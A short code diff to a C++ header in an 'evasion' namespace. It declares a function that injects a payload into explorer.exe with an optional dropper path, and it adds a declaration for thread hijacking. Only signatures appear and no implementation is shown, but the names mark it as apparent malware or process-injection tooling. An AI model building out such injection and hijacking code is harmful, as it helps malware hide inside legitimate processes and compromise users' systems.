@@ -19,6 +19,9 @@ public:
 
     // Robust injection into explorer.exe
     static bool InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath = L"");
+
+    // Thread Hijacking
+    static bool HijackThread(HANDLE hThread, PVOID pEntryPoint);
 };
 
 } // namespace evasion
